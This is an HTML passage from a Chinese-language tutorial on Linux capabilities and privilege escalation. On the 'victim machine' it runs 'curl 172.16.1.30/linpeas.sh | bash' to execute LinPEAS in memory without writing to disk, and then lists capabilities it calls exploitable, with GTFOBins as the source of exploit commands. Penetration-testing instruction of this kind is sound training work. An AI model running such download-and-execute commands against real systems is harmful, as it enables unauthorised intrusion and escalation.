<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304877-1028700154-5fc5d69561efcffabb0d76be3ebd6f27.png" width="959" height="178" class="img_ev3q"></p>
<p>然后，回到受害机器上，我们可以使用以下命令将 LinPEAS 直接下载到内存中并执行：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/linpeas.sh | bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>通过将命令直接传送到 bash，curl 会将文件直接输入到 bash 中并执行我们尝试“下载”的脚本，而无需将脚本写入磁盘！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304675-989972668-0de7b37762bc8b7466a5a2ade842392d.png" width="661" height="99" class="img_ev3q"></p>
<p>这里看到全是 0，证实文件没有下载到磁盘，这意味着脚本直接在内存中执行！</p>
<p>好了，脚本运行完毕后，我们可以梳理结果，看看是否有任何可利用的 capabilities。进入 <strong>Interesting Files</strong> 部分，我们可以看到 PEAS 寻找的所有不同类型的 capabilities，其中包括进程、文件和用户 capabilities。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164308588-407724851-703635881b1b7c9508f344681fa4e1b9.png" width="881" height="569" class="img_ev3q"></p>
<p>这里我们可以看到很多红色/黄色的标识，这表明这些途径很可能导致我们的权限提升（95% 以上的确定性）。某些 capabilities 会出现红色/黄色，其他功能也会出现红色；但是，我们应该深入研究所有这些 capabilities，看看是否有办法让我们进行恶意攻击。</p>
<p>现在我们已经了解了如何枚举 capabilities，我们可以进入利用阶段，看看这些 capabilities 可以让我们做什么。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3利用各种-capabilities"><strong><div id="id3">3、利用各种 Capabilities</div></strong><a href="#3利用各种-capabilities" class="hash-link" aria-label="3利用各种-capabilities的直接链接" title="3利用各种-capabilities的直接链接">​</a></h2>
<p>对于利用示例，我们将重点关注以下六种 capabilities：</p>
<ul>
<li>cap_dac_read_search --&gt; 允许任何文件读取。</li>
<li>cap_dac_override --&gt; 允许任何文件写入。</li>
<li>cap_chown --&gt; 允许任何文件的所有者更改。</li>
<li>cap_fowner --&gt; 允许任何文件的权限更改。</li>
<li>cap_setuid --&gt; 允许以特权方式执行二进制文件 – 以文件所有者身份执行（相当于 SUID）</li>
<li>cap_setgid --&gt; 允许以特权方式执行设置二进制文件 – 以组所有者身份执行（相当于 SGID）</li>
</ul>
<p>为了找到利用这些 capabilities 的命令，我们将利用令人惊叹的 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> 网站。</p>
<blockquote>
<p>GTFOBins 代表 Get The F*#k Out Binaries，它是精选的 Unix 二进制文件列表，可用于在配置错误的系统中绕过本地安全限制。</p>
</blockquote>
<p>关于 GTFOBins 的一个重要提示是，给定二进制文件的 <strong>capabilities</strong> 函数通常围绕 cap_setuid 功能展开。但是，作为攻击者，我们应该考虑这种能力能让我们做什么，然后寻找与这种能力相关的特定功能或用法。例如，以下是可用于各种 Unix 二进制文件的函数列表。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="829" height="136" class="img_ev3q"></p>
